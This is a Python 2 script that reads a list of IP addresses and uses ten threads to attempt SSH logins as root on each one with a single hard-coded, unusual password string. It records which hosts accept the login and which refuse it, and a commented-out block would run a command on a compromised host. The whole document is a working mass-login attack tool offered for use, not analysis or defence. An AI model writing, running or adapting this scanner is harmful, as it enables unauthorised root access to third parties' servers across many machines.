import paramiko 
import threading
import time
import Queue
click=0
threads=[]

class myThread(threading.Thread):
	def __init__(self,threadID,q):
		threading.Thread.__init__(self)
		self.threadID=threadID
		self.q=q
	def stop(self):
		self.doRecv = False
	def run(self):
		while not self.q.empty():
			ip=self.q.get()

			connect(ip,self.threadID)

		

def connect(ip,threadnum):
	global click
	click=click+1
	num=str(click)
	client = paramiko.SSHClient() 
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(ip, 22, username='root', password="<<< %s(un='%s') = %u", timeout=4)
		print num+'--'+ip+" --- OK"+'--thrad-'+str(threadnum)
		f1=open('ipsuccess.txt','a')
		f1.write(ip+'\n')
		f1.close()
	except:
		f2=open('ipfault.txt','a')
		print num+'--'+ip+" --- ERROR"+'--thrad-'+str(threadnum)
		f2.write(ip+'\n')
		f2.close()
	#stdin, stdout, stderr = client.exec_command('ls -l') 
	#for std in stdout.readlines(): 
	#	print std, 
	client.close() 

if __name__ == '__main__':
	workQueue=Queue.Queue()
	threadLock=threading.Lock()
	f=open('urllist.txt','r')
	threadLock.acquire()
	for ip in f:
		fip=ip.replace('\n','')
		workQueue.put(fip)
	threadLock.release()
	f.close()

	for i in range(10):
		thread=myThread(i,workQueue)
		thread.start()
		threads.append(thread)
	for t in threads:
		t.join(10)
		t.stop()

